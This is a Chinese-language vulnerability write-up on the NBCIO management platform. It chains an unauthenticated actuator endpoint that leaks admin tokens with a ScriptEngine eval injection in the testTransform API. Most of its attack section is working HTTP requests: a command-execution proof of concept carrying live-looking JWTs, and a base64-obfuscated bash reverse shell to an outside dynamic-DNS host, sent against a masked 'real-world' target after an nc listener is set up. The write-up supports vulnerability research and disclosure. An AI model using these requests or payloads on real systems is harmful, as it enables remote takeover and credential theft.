一、项目简介
======

NBCIO 亿事达企业管理平台后端代码，基于jeecgboot3.0和flowable6.7.2，初步完成了集流程设计、流程管理、流程执行、任务办理、流程监控于一体的开源工作流开发平台，同时增加了聊天功能、大屏设计器、网盘功能和项目管理。  
项目地址：<https://gitee.com/nbacheng/nbcio-boot>

二、环境搭建
======

只需修改配置文件中的mysql和redis连接信息即可正常运行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-69ce75e3196e0d778d10e9a9a2239b8eafd89cea.png)

三、未授权分析
=======

在ShiroConfig中放开了actuator方法的未授权访问  
org/jeecg/config/shiro/ShiroConfig.java:156

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-4fad000cb6184288b7173d14e5b6d7617e69c6b0.png)  
直接访问/actuator/httptrace可以免认证获取管理员的token信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-08b79218b25cb5a91836ffbba22800b1c432268b.png)

四、RCE分析
=======

此处代码调用了ScriptEngine的eval方法，此方法若不做特殊处理易引起代码注入问题，这里不做过多解释。  
com/nbcio/modules/estar/bs/service/impl/DataSetParamServiceImpl.java:99

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-11071412ac100da644f6bf0c1ade0d9f6ec5a1f8.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-84cc0929d8b76caf0a03b2793988a7046e37eea2.png)  
根据方法调用反向跟踪到了/testTransform接口

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-96128d8d6ecd91aa2af958da2877cc405a4f8bf6.png)  
由于该接口参数结构较为复杂，所以需要找到前端触发点直接抓包获取参数。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-4c62f1d40eb18b74db0ce9455378bd0e45f4786f.png)  
点击测试预览即可触发该接口

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-16e62c04e257435c28d0d7320efde616d91d27af.png)  
抓包修改参数并发出请求。

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-0efaaf52b2720ab2de016012c3cd2a9152e8b97b.png)  
成功触发计算器，本地测试OK

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-b0e54bd013107b519d660aa045b64935ff391a3f.png)

```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: 192.168.64.1:8081
Content-Length: 345
Accept: application/json, text/plain, */*
X-TIMESTAMP: 20240808213818
X-Sign: ED5C3621799AA3EAC6D2ABAB498B1DCD
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMxMzU3MDAsInVzZXJuYW1lIjoiYWRtaW4ifQ.t5je51OW1Q40U-8d0HudQCXQc-WXQbP7o9cmvKjsO3Y
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://218.75.87.38:9888
Referer: http://218.75.87.38:9888/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"sourceCode":"mysql","dynSentence":"select * from bs_report_barstack","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"java.lang.Runtime.getRuntime().exec('calc');"}],"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"sql"}
```

五、漏洞实战
======

### 1、按照第三步获取管理员认证信息

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-44f9f533677ac5a9041359c67265d38e7148503b.png)

```xml
GET /nbcio-boot/actuator/httptrace HTTP/1.1
Host: *****
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```

### 2、打开kali，nc监听指定端口

nc -lvnp 7777

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-8ba0739c028069f76f1badd7622c0338dc3c1463.png)

### 3、发送反弹shell的poc

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-6a3ad267327310d0bdb6fec9faa12972c4751a4d.png)

```xml
POST /nbcio-boot/bs/bsDataSet/testTransform HTTP/1.1
Host: ****
Content-Length: 450
Accept: application/json, text/plain, */*
tenant-id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjMyMjgyMTQsInVzZXJuYW1lIjoiYWRtaW4ifQ.oCbEjdP074ORip82D4ix27FtG0WgVnAlc7fjRZeZxgM
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"sourceCode":"mysql","dynSentence":"select * from bs_report_barstack","dataSetParamDtoList":[{"paramName":"","paramDesc":"","paramType":"","sampleItem":"","mandatory":true,"requiredFlag":1,"validationRules":"java.lang.Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaT4mIC9kZXYvdGNwLzZ2NzI4NzAyZjYuemljcC5mdW4vNTMyNjcgMD4mMQ==}|{base64,-d}|{bash,-i}\");"}],
"dataSetTransformDtoList":[{"transformType":"js","transformScript":""}],"setType":"sql"}
```

### 4、成功获取到目标shell

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/08/attach-f169880d9a42e4b80531185963b51b0422984c1e.png)  
至此，漏洞分析结束。